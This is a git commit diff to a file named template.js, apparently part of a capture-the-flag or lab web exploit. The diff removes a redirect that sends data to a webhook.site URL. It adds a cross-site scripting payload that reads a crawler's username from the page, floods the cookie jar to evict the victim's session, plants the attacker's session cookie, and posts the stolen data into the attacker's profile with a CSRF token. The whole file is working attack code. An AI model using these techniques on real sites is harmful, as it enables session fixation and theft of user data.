cbf3539a383d88ae752a0b30bd136add056b05fd
qquang <vanhieuho200@gmail.com>
2022-09-07 14:35:57 +0700

    ok

--- template.js
+++ template.js
@@ -1,1 +1,27 @@
-location.href = "http://webhook.site/a18dafbc-8a62-49f8-95dc-9eec735f9a8e/?x="
+//send request to / => get the crawler's username
+var result;
+xhr = new XMLHttpRequest();
+xhr.open('GET', '/');
+xhr.onreadystatechange = function() {
+    result = xhr.responseText;
+    dom = new DOMParser();
+    result_parsed = dom.parseFromString(result, 'text/html');
+    title = result_parsed.title; //The title contains the crawler's username
+
+    //overwrite crawler's session cookie => my session cookie
+    for (let i = 0; i < 700; i++) {
+        document.cookie = `cookie${i}=${i}`;
+    }
+    for (let i = 0; i < 700; i++) {
+        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
+    }
+    document.cookie = 'session=<my_session_cookie>;path=/';
+
+    //Update my bio with my csrf_token
+    xhr_2 = new XMLHttpRequest();
+    xhr_2.open('POST', '/api/user/update');
+    xhr_2.withCredentials = true;
+    xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr_2.send("bio=asdTitle:" + title + "&csrf_token=<my_csrf_token>");
+}
+xhr.send();
